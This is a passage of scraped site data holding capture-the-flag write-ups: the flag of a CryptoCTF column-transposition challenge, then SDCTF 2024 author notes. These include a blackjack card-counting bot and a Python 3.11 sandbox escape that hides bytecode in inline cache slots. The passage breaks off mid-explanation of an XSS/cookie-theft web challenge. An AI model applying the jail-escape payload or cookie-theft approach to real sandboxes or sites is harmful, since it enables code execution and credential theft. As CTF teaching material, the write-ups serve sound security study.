FLAGCCTF{3nCrypTioN_8Y_c0lUmn4R_7rAnSp05it!On!}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...\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Chr>\n\u003Ch2 id=\"flag\">\u003Ca href=\"#flag\">Flag\u003C/a>\u003C/h2>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">CCTF{3nCrypTioN_8Y_c0lUmn4R_7rAnSp05it!On!}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"CCTF{3nCrypTioN_8Y_c0lUmn4R_7rAnSp05it!On!}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>",{"headings":120,"localImagePaths":127,"remoteImagePaths":128,"frontmatter":129,"imagePaths":132},[121,124,125,126],{"depth":34,"slug":122,"text":123},"bertrand-180-pts-21-solves","Bertrand (180 pts) 21 solves",{"depth":38,"slug":39,"text":40},{"depth":38,"slug":42,"text":43},{"depth":38,"slug":45,"text":46},[114,115],[],{"title":103,"date":130,"tags":131},["Date","2023-07-10T05:18:14.000Z"],[106,107,108,21,22,109,110],[114,115],"CryptoCTF-2023-Writeup-Bertrand/index.md","sdctf-2024-author-writeups",{"id":134,"data":136,"body":147,"filePath":148,"assetImports":149,"digest":155,"rendered":156,"legacyId":238},{"title":137,"date":138,"tags":139},"SDCTF 2024 Author Writeups: Python 3.11 Cache Exploitation, Prototype Pollution, and Blackjack!",["Date","2024-05-15T02:00:00.000Z"],[60,21,140,141,142,143,144,145,22,146],"dompurify","prototype-pollution","servicenow","card-counting","python-bytecode","css-injection","author-writeup","![](logo.png)\n\nThis weekend, ACM Cyber at UC San Diego hosted **SDCTF 2024**, an online CTF competition lasting 48 hours, where players around the world complete to solve challenges and capture flags in the categories: web, pwn, reverse engineering, cryptography, and misc. I was one of the authors for this CTF, and wrote 4 challenges in total. In this post, I will share notes on my explanations, ideas, and solutions for each of the challenges I wrote.\n\n# Misc\n\n## Blackjack (14 solves, 162 pts)\n\n### Description\n\nGAMBA\n\n### Challenge\n\nYou are given an attachment `blackjack.zip`. This file contains the necessary files to run a Docker container. Once running the entry, `main.py` script, we are prompted with the following:\n\n```console\n[Dealer] Resetting shoe...\nPlayer balance: 30000\n[BEGIN USER INTERACTION]\nPlayer, enter your bet:\n```\n\nWe are given $30000 to start with and we can place bets to play blackjack. The `main.py` file is as follows:\n\n```py\nimport os\nfrom game import Game, TABLE_MINIMUM, TABLE_MAXIMUM, TOO_MUCH_MONEY\n\nFLAG = os.environ.get(\"FLAG\", \"sdctf{test_flag}\")\n\ngame = Game()\ngame.start_game()\nwhile True:\n    game.play_round()\n    if game.player.balance \u003C TABLE_MINIMUM:\n        print(\"You don't have enough money to play another round. Goodbye.\")\n        break\n    if game.player.balance > TOO_MUCH_MONEY:\n        print(\"I'm sorry I'm going to have to back you off. You're too good for us.\")\n        print(f\"Here is a flag for your troubles: {FLAG}\")\n        break\n```\n\nFrom here we can see that if we can get our balance to exceed `TOO_MUCH_MONEY`, we will be given the flag. The `TOO_MUCH_MONEY` is defined in `game.py` as `150000`. The `Game` class is defined in `game.py` and contains the logic for the blackjack game.\n\n```py\nTABLE_MINIMUM = 50\nTABLE_MAXIMUM = 2000\nTOO_MUCH_MONEY = 150000\n```\n\n### Notes\n\nI hope people didn't spend too much time trying to find a programming bug in the blackjack source code itself, since there was not intended to be one. The intended solution is a \"vulnerability\" in the game of Blackjack itself. While the game normally has a house edge, its possible to play in such a way that the player can start to even out those odds. This strategy is called \"Basic Strategy\" and is a set of rules that tells you the optimal best move to make in every situation. Its possible to go further using rules such as card counting and deviations, and this can start to give the player an edge over the house.\n\nWhen developing the challenge, I found with only basic strategy, a bit of time, and some luck, it was possible to still achieve the target balance, so this was sufficient. This was more of a PPC challenge and I hope people enjoyed it.\n\n### Solve Script\n\n```py\nH, S, D, SP = 'hit', 'stand', 'double', 'split'\n\nPLAYER_TOTAL = [\n    #   2       3       4       5       6       7       8       9       10      A\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 2\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 3\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 4\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 5\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 6\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 7\n    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 8\n    [   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  # 9\n    [   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  # 10\n    [   D,      D,      D,      D,      D,      D,      D,      D,      D,      H   ],  # 11\n    [   H,      H,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 12\n    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 13\n    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 14\n    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 15\n    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 16\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 17\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 18\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 19\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 20\n]\n\nHANDS_WITH_ACE = [\n    #   2       3       4       5       6       7       8       9       10      A\n    [   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  # A2\n    [   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  # A3\n    [   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A4\n    [   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A5\n    [   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A6\n    [   S,      D,      D,      D,      D,      S,      S,      H,      H,      H   ],  # A7\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # A8\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # A9\n]\n\nPAIR = [\n    #   2       3       4       5       6       7       8       9       10      A\n    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 2,2\n    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 3,3\n    [   H,      H,      H,      SP,     SP,     H,      H,      H,      H,      H   ],  # 4,4\n    [   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  # 5,5\n    [   SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H,      H   ],  # 6,6\n    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 7,7\n    [   SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP  ],  # 8,8\n    [   SP,     SP,     SP,     SP,     SP,     S,      SP,     SP,     S,      S   ],  # 9,9\n    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 10,10\n    [   SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP  ],  # A,A\n]\n\nimport re\ndef extract_cards_from_string(s):\n    extract = r\"\\b(\\w+|\\d+)\\s+of\\b\"\n    return re.findall(extract, s)\n\ndef get_value(cards):\n    value = 0\n    aces = 0\n    for card in cards:\n        if card.isnumeric():\n            value += int(card)\n        else:\n            if card == 'Ace':\n                aces += 1\n                value += 11\n            else:\n                value += 10\n\n    while value > 21 and aces:\n        value -= 10\n        aces -= 1\n\n    soft = aces > 0\n    return value, soft\n\nfrom pwn import *\n\nBALANCE = 30000\n\nsprint = print\nprint = lambda *x: None\n\ndef update_count(card):\n    global count\n    if card not in ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'Jack', 'Queen', 'King', 'Ace']:\n        print(\"INVALID CARD\", card)\n        exit()\n    if card in ['2', '3', '4', '5', '6']:\n        count += 1\n\n    elif card in ['10', 'Jack', 'Queen', 'King', 'Ace']:\n        count -= 1\n\ncount = 0\ncards_seen = 0\ngame_state = {}\n\nvalidate_end_turn_computation = 1\n\nimport time\np = remote(\"127.0.0.1\", 36051)\nwhile 1:\n    try:\n        resp = p.recvuntil(b\"[BEGIN USER INTERACTION]\\n\")[:-len(b\"[BEGIN USER INTERACTION]\\n\")].decode().split(\"\\n\")\n        resp = [x.strip() for x in resp if x]\n\n        for line in resp:\n            print(f\"[RESP] {line}\")\n\n        # This message gives information about the count\n        if resp[-1].startswith(\"Player balance\"):\n            BALANCE = float(resp[-1].split(\" \")[-1])\n            sprint(\"MY BALANCE: \", BALANCE)\n            dealer_hand = [line for line in resp if line.startswith(\"[Dealer] Dealer's ending hand\")]\n            if not dealer_hand:\n                validate_end_turn_computation -= 1\n                if validate_end_turn_computation \u003C 0:\n                    print(\"SOMETHING IS WRONG\")\n                    exit()\n            else:\n                ending_hand_line = [line for line in resp if line.startswith(\"[Dealer] Dealer's ending hand\")][0]\n                my_ending_hands = [line for line in resp[resp.index(ending_hand_line):] if line.startswith(\"(Hand \")]\n\n                dealer_hand = extract_cards_from_string(ending_hand_line)\n                my_ending_hands = [extract_cards_from_string(hand) for hand in my_ending_hands]\n                print(resp)\n                print(my_ending_hands, dealer_hand)\n                for card in dealer_hand:\n                    update_count(card)\n                    cards_seen += 1\n\n                for hand in my_ending_hands:\n                    for card in hand:\n                        update_count(card)\n                        cards_seen += 1\n\n        for line in resp:\n            if \"Resetting shoe\" in line:\n                print(\"RESET COUNT\")\n                count = 0\n                cards_seen = 0\n            if \"Remaining balance\" in line:\n                BALANCE = float(line.split('$')[-1])\n            elif \"Dealer's up card\" in line:\n                upcard = extract_cards_from_string(line)[0]\n                game_state['upcard'], _ = get_value([upcard])\n\n        input_prompt = p.recv().decode()\n\n        print(\"INPUT>>> \" + input_prompt)\n        if \"enter your bet\" in input_prompt:\n            # High risk high reward counting strategy\n            true_count = int(count / ((52*4 - cards_seen) / (52)))\n            if true_count \u003C= 1:\n                bet = max(50, min(BALANCE, 50))\n            elif true_count == 2:\n                bet = max(50, min(BALANCE, 500))\n            elif true_count == 3:\n                bet = max(50, min(BALANCE, 2000))\n            elif true_count == 4:\n                bet = max(50, min(BALANCE, 2000))\n            elif true_count >= 5:\n                bet = max(50, min(BALANCE, 2000))\n\n            p.sendline(str(int(bet)))\n            BALANCE -= bet\n\n            game_state = {}\n\n        elif \"What would you like to do?\" in input_prompt:\n            options = input_prompt.split(\"(\")[-1].split(\")\")[0].split(\", \")\n            print(resp)\n            my_cards = [line for line in resp if line.startswith(\"(Hand \")][-1]\n            my_cards = extract_cards_from_string(my_cards)\n            my_value, soft = get_value(my_cards)\n\n            if my_value == 21:\n                p.sendline(b\"stand\")\n                continue\n\n            upcard = game_state['upcard']\n            print(\"My cards: \", my_cards)\n            print(\"My value: \", my_value)\n            print(\"Soft: \", soft)\n            print(\"Upcard: \", upcard)\n            if len(my_cards) == 2 and my_cards[0] == my_cards[1] and 'split' in options:\n                print(\"USING PAIR STRATEGY\")\n                option = PAIR[get_value([my_cards[0]])[0] - 2][upcard - 2]\n            elif soft:\n                print(\"USING HANDS WITH ACE STRATEGY\")\n                option = HANDS_WITH_ACE[my_value - 13][upcard - 2]\n            else:\n                print(\"USING PLAYER TOTAL STRATEGY\")\n                option = PLAYER_TOTAL[my_value - 2][upcard - 2]\n\n            def resolve_and_execute(option):\n                if option in options:\n                    p.sendline(option)\n                    print(f\"Choosing {option}\")\n                else:\n                    print(f\"Choosing {option}, resolving to hit\")\n                    p.sendline(b'hit')\n            resolve_and_execute(option)\n\n    except EOFError:\n        sprint(p.clean().decode())\n        break\n\nprint(resp)\n```\n\n### References\n\n- https://www.blackjackapprenticeship.com/blackjack-strategy-charts/\n- https://en.wikipedia.org/wiki/Card_counting\n\n---\n\n## my-favorite-code (1 solve, 500 pts)\n\n### Description\n\nHey. I'm looking for my friend Penguin, have you seen him?\n\n### Challenge\n\nYou are given an attachment `my-favorite-code.zip`. This file contains `jail.py`, and a Dockerfile for the remote setup.\n\nThe file first prompts the user to select their favorite python opcode. It then adds both the users selected opcode and `COMPARE_OP` to a set called `CHOICES`.\n\n```py\nCHOICES = set()\n\nprint(\"My favorite python opcode is COMPARE_OP!\")\nCHOICES.add('COMPARE_OP')\nprint(\"What is your favorite python opcode?\")\nop = input()\n\nif op not in opcode.opmap:\n    print(\"That opcode doesn't exist!\")\n    exit()\n\nCHOICES.add(op)\n```\n\nNext, we are asked to provide some base64 encoded string.\n\n```py\nprint(\"I wonder what we can do with these...\")\ncode = base64.b64decode(input())\n```\n\nFinally, the code is run:\n\n```py\nif not run(code):\n    print(\"I guess not much.\")\nelse:\n    print(\"WOW\")\n```\n\nLets look a bit closer at this run method:\n\n```py\ndef get_instructions(func):\n    return {x.opname for x in dis.Bytecode(func)}\n\ndef run(code):\n    code = marshal.loads(code)\n    instructions = get_instructions(code)\n    if instructions != CHOICES:\n        return False\n\n    def runner():\n        ...\n\n    runner.__code__ = code\n    runner()\n```\n\nWe unmarshal the bytes sent by the user. We then use `dis.Bytecode` to get a set containing of all the OPCODES in the main procedure of the function. Finally, if this set is equal to our original choices, we run the code, by replacing the `__code__` object of a dummy function to the inputted code object, and calling it.\n\nNote furthermore, the docker container shows that we have a flag on the system, which implies that this challenge requires us to run arbitrary code and escape the jail.\n\n### Solution\n\nWhat appears to be happening is that we need to somehow gain arbitrary code execution using only 2 OPCODES. But this seems impossible?! Expecially since we are forced to use `COMPARE_OP`, which at face value doesn't seem to do much. We can try picking an opcode like CALL, but we end up with issues since we still need to use LOAD_NAME or LOAD_GLOBAL to get function we want to call. If we use LOAD_NAME, then we can get objects on the stack, but we can't really do much with it.\n\nA key insight, which was provided and necessary to identify in the challenge files is the Python version of the server. In the Dockerfile, we can see the server is running `python3.11`. Python3.11 adds some interesting features, but 1 subtle feature which it states in the release notes:\n\n> The bytecode now contains inline cache entries, which take the form of the newly-added CACHE instructions. Many opcodes expect to be followed by an exact number of caches, and instruct the interpreter to skip over them at runtime. Populated caches can look like arbitrary instructions, so great care should be taken when reading or modifying raw, adaptive bytecode containing quickened data.\n\n### Inline Cache?\n\nInline cache is an addition added via the following cpython [issue](https://github.com/python/cpython/issues/90997). The idea is that certain OPCODES will be provided space that allows for the interpreter to cache certain values. This is done to speed up the interpreter, and is a form of optimization. The cache is stored in the bytecode directly, so does not require any overhead or change on the interpreter side. We can see this when we inspect certain functions using dis in `python3.11`:\n\n```py\nPython 3.11.4 (main, Jun  7 2023, 12:45:48) [GCC 11.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from dis import dis\n>>> def f():\n...     return int('1')\n...\n>>> dis(f, show_caches=True)\n  1           0 RESUME                   0\n\n  2           2 LOAD_GLOBAL              1 (NULL + int)\n              4 CACHE                    0\n              6 CACHE                    0\n              8 CACHE                    0\n             10 CACHE                    0\n             12 CACHE                    0\n             14 LOAD_CONST               1 ('1')\n             16 PRECALL                  1\n             18 CACHE                    0\n             20 CALL                     1\n             22 CACHE                    0\n             24 CACHE                    0\n             26 CACHE                    0\n             28 CACHE                    0\n             30 RETURN_VALUE\n```\n\nWith the `show_caches` flag in any dis function, we can see the caches space for each operation. What this means at interest for us, is that when LOAD_GLOBAL instruction is executed, the interpreter will need to actually jump over the 5 cache entries. Interestingly, `COMPARE_OP` is one such function which has 2 CACHE entries.\n\nNote however, that if we call `get_instructions` function as shown in the source code on this function:\n\n```py\n>>> get_instructions(f)\n{'CALL', 'LOAD_GLOBAL', 'RETURN_VALUE', 'LOAD_CONST', 'PRECALL', 'RESUME'}\n```\n\nWe don't see those CACHE lines. With this, we have an idea of how to solve the challenge.\nWe want to design our bytecode in such a way that the only OPCODES visible to dis, are `COMPARE_OP`, and something else. We can then use the CACHE entries to store the actual OPCODES we want to run. What will that something else be, `JUMP_FORWARD`! This will give us the ability to jump into these CACHE entries, and execute the hidden OPCODES.\n\n### Solve Script\n\n```py\nimport opcode\nfrom opcode import opmap\nimport base64\nimport dis\n\nimport marshal\nimport tempfile\n\nimport sys, os\n\nfor k in opmap:\n    globals()[k] = opmap[k]\n\ndef f():\n    breakpoint()\n\ncode = f.__code__\nb = marshal.dumps(code)\n\ndis.dis(code, show_caches=True)\nco_code = code.co_code\nprint(len(co_code))\n\nco_code_section = len(co_code).to_bytes(4, byteorder='little') + co_code\n\n\nprefix = b[:b.find(co_code_section)]\nsuffiix = b[b.find(co_code_section) + len(co_code_section):]\n\n\"\"\"\nNote: Lines that end with #, indicate its visible to dis.Bytecode, rest are hidden\n\"\"\"\nnew_code = bytearray([\n    JUMP_FORWARD, 1, #\n    COMPARE_OP, 0, #\n    LOAD_GLOBAL, 1,\n    0, 0,\n    COMPARE_OP, 0, #\n    0, 0,\n    0, 0,\n    COMPARE_OP, 0, #\n    NOP, 0,\n    JUMP_FORWARD, 1,\n    COMPARE_OP, 0, #\n    PRECALL, 0,\n    0, 0,\n    JUMP_FORWARD, 1, #\n    COMPARE_OP, 0, #\n    CALL, 0,\n    0, 0,\n    JUMP_FORWARD, 1, #\n    JUMP_FORWARD, 1, #\n    JUMP_FORWARD, 1, #\n    JUMP_FORWARD, 1, #\n    COMPARE_OP, 0, #\n    POP_TOP, 0,\n    LOAD_CONST, 0,\n    JUMP_FORWARD, 1, #\n    COMPARE_OP, 0, #\n    RETURN_VALUE, 0\n])\n\n\nprint(f\"New code: {new_code}\")\ndis.dis(new_code )\nprint('-'*40)\ndis.dis(new_code, show_caches=True )\n\nnew_code_section = len(new_code).to_bytes(4, byteorder='little') + new_code\n\nnew_code_object = prefix + new_code_section + suffiix\npayload = base64.b64encode(new_code_object)\n\ndef runner():\n    ...\n\nrunner.__code__ = marshal.loads(new_code_object)\n# runner()\n\nfrom pwn import *\n\nr = remote('localhost', 33851)\nr.sendlineafter(b\"opcode?\", b\"JUMP_FORWARD\")\nr.sendlineafter(b\"these...\", payload)\nr.interactive()\n```\n\n### Notes\n\nThis was hopefully a fun challenge to solve. I think the overall payload is not too long, but the main inspiration is realizing how to trick the disassembler in what is actually being run. Its interesting to see how the code is offset by the CACHE entries, and how we can use this to our advantage.\n\nThis challenge had one solve by `Maple Bacon`, and used an additional trick, which was the fact that the code object could contain lambda functions, but these would not be checked by the disassembler. This allowed them to create a lambda function that would execute the hidden code object. However in order to call this lambda function, it was still necessary to use the CACHE jump trick. Very nice!\n\n### References\n\n- https://docs.python.org/3.11/whatsnew/3.11.html#cpython-bytecode-changes\n- https://github.com/python/cpython/issues/90997\n\n---\n\n# Web\n\n## fancy_text_viewer (4 solves, 444 pts)\n\n### Description\n\nWOW TEXT SO COOL. Take a look at how cool I made this text. I hear the admin gets special text, not fair!\n\n### Challenge\n\nYou are given source code and a route to a website called Fancy Text Viewer. Upon logging in, you are greeted with a simple page that allows you to enter text:\n![](image.png)\n\nWhen entered, you are taken to `/view` where you can see the text you entered in a fancy format.\n\nThe `app.js` is the most important file in this challenge. We import the following dependencies:\n\n```js\nimport express from \"express\";\nimport cookieParser from \"cookie-parser\";\nimport fs from \"fs\";\nimport { JSDOM } from \"jsdom\";\nimport createDOMPurify from \"dompurify\";\nimport bot_goto from \"./bot.js\";\n```\n\nWe then create the express app, and set up the cookie parser. We then define various routes:\n\n```js\nconst app = express();\n...\n\napp.set(\"view engine\", \"ejs\");\napp.use(cookieParser());\napp.use('/static', express.static('public'))\n\napp.use((req, res, next) => {\n    for (const key in req.query) {\n        let value = req.query[key];\n        delete req.query[key];\n        req.query[key.toLowerCase()] = value;\n    }\n    next();\n});\napp.get(\"/\", (req, res) => {\n    const sharedby = sanitize(req.query.sharedby || \"\");\n    const username = req.cookies.username || \"GUEST\";\n    const flag = req.cookies.flag || \"\";\n    res.render(\"index\", { sharedby, username, flag });\n});\n\napp.get(\"/login\", (req, res) => {\n    const secret = req.query.secret || \"\";\n    if (secret !== ADMIN_PASSWORD) {\n        res.status(401).send(\"login fail\");\n    } else {\n        res.cookie(\"username\", \"ADMIN\");\n        res.cookie(\"flag\", FLAG, { httpOnly: true });\n        res.redirect(\"/\");\n    }\n});\n\napp.get(\"/view\", (req, res) => {\n    const content = req.query.content;\n    const clrs = [];\n    for (let i = 0; i \u003C 4; i++) {\n        clrs.push(\"#\" + randomhexstring(6));\n    }\n    res.render(\"view\", { content, clrs });\n});\n\napp.get(\"/redirect\", (req, res) => {\n    let url = req.query.url;\n    if (!url.startsWith(\"http://\") && !url.startsWith(\"https://\")) {\n        url = \"http://\" + url;\n    }\n    res.redirect(url);\n});\n\napp.get(\"/bot\", (req, res) => {\n    const url = req.query.url;\n    bot_goto(url, ADMIN_PASSWORD);\n    res.send(\"OK\");\n});\n\napp.listen(4444, \"0.0.0.0\", () => {\n    console.log(\"Server is running on http://0.0.0.0:4444\");\n});\n```\n\nWe also have an ejs template for `index.ejs`, which is as follows:\n\n```html\n\u003C!DOCTYPE html>\n\u003Chtml lang=\"en\">\n\n\u003Chead>\n    \u003Cmeta charset=\"UTF-8\">\n    \u003Cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    \u003Ctitle>\n        Fancy Text Viewer\n        \u003C% if (sharedby) { %>\n            | Shared by \u003C%- sharedby %>\n        \u003C% } %>\n    \u003C/title>\n    \u003C!DOCTYPE html>\n    \u003Chtml>\n\n    \u003Chead>\n        \u003Clink rel=\"stylesheet\" href=\"/static/style.css\">\n    \u003C/head>\n\u003C/head>\n\n\u003Cbody>\n    \u003Cdiv class=\"container\">\n        \u003Ch2>Hello \u003C%- username %>!\u003C/h2>\n        \u003Cp>Enter your text below, and we will make it fancy!\u003C/p>\n\n        \u003Cform action=\"/view\" method=\"get\">\n            \u003Cinput type=\"text\" name=\"content\" placeholder=\"Enter your text here\" required>\n            \u003Cbr>\n            \u003Cbr>\n            \u003Cbutton type=\"submit\">Submit\u003C/button>\n        \u003C/form>\n\n        \u003Cbr>\n        \u003C% if (flag) { %>\n            \u003Cp>Oh? You seem to have a flag! You can view it \u003Ca href=\"view?content=\u003C%- flag %>\">here\u003C/a>!\u003C/p>\n        \u003C% } %>\n\n        \u003C% if (username !=='GUEST' ) { %>\n            \u003Cdiv>\n                \u003Cp>Do you like this site? Share it to a friend! \u003C/p>\n                \u003Cbutton id=\"shareButton\">Share\u003C/button>\n                \u003Cscript>\n                    window.onload = () => {\n                        let sharingUrl = new URL(window.location.href);\n\n                        const usernameCookie = document.cookie.split('; ').find(cookie => cookie.startsWith('username='));\n                        if (usernameCookie) {\n                            const usernameValue = usernameCookie.split('=')[1];\n                            sharingUrl.searchParams.append('sharedby', usernameValue);\n                        }\n\n                        document.getElementById('shareButton').addEventListener('click', () => {\n                            navigator.share({\n                                title: 'Fancy Text Viewer',\n                                text: 'Check out this fancy text viewer!',\n                                url: sharingUrl\n                            })\n                        });\n                    }\n                \u003C/script>\n            \u003C/div>\n        \u003C% } %>\n    \u003C/div>\n    \u003Cbr>\n\u003C/body>\n\u003C/html>\n```\n\nWe can further notice the bot.js file, which does the following:\n\n```js\nimport puppeteer from \"puppeteer\";\n\nconst sleep = (milliseconds) => {\n  return new Promise((resolve) => setTimeout(resolve, milliseconds));\n};\n\nconst CHALL_URL = \"http://127.0.0.1:4444\";\n\nexport default async function bot_goto(url, password) {\n  console.log(`Requesting ${url}`);\n  try {\n    const browser = await puppeteer.launch({\n      args: [\n        \"--no-sandbox\",\n        \"--disable-gpu\",\n        \"--js-flags=--noexpose_wasm,--jitless\",\n      ],\n      executablePath: \"/usr/bin/google-chrome\",\n    });\n\n    let page = await browser.newPage();\n    await page.goto(CHALL_URL + \"/login?secret=\" + password);\n    await sleep(1000);\n    await page.close();\n    await sleep(100);\n\n    page = await browser.newPage();\n    await page.goto(url);\n    await sleep(10000);\n    await page.close();\n    await sleep(100);\n  } catch (e) {\n    console.log(`Request Failed (${url})`);\n  }\n}\n```\n\nLooking at the `/login` route again more closely,\n\n```js\napp.get(\"/login\", (req, res) => {\n  const secret = req.query.secret || \"\";\n  if (secret !== ADMIN_PASSWORD) {\n    res.status(401).send(\"login fail\");\n  } else {\n    res.cookie(\"username\", \"ADMIN\");\n    res.cookie(\"flag\", FLAG, { httpOnly: true });\n    res.redirect(\"/\");\n  }\n});\n```\n\nWe can see that the if a user successfully logs in with the correct `ADMIN_PASSWORD`, they will be given the flag in a cookie. The admin bot that we see correctly knows this password, and will log in as the admin. The admin bot will then visit any page we give it. Its clear that we need to somehow get the flag by some means.\n\n### Solution\n\nSo there are a few initial observations that are helpful in this challenge. First overall there isn't actually much you can control. The admin bot will have its username and flag cookie set on its own, but the only other input is the `sharedby` param in the `/` page. There is also a pretty suspicious `sanitize` function which clearly very relevant to the challenge.\n\n```js\nfunction sanitize(str) {\n  str = str.replace(/[^(0-Z. )]/g, \"\");\n  return DOMPurify.sanitize(str);\n}\n```\n\nThe `sharedby` param that we pass will be filtered, then sanitized by `DOMPurify.sanitize`. Note this means that the character set is 0-9, A-Z, dot, space, and some special characters between 0x3A and 0x40 (`:;\u003C=>?@`).\n\nAdditionally this parameter is not sanitized when it is passed to the `index.ejs` file.\n\n```html\n\u003Ctitle>\n  Fancy Text Viewer \u003C% if (sharedby) { %> | Shared by \u003C%- sharedby %> \u003C% } %>\n\u003C/title>\n```\n\nSecond, note that even though the flag cookie is HTTPOnly, its actually present in the DOM. You can determine how it 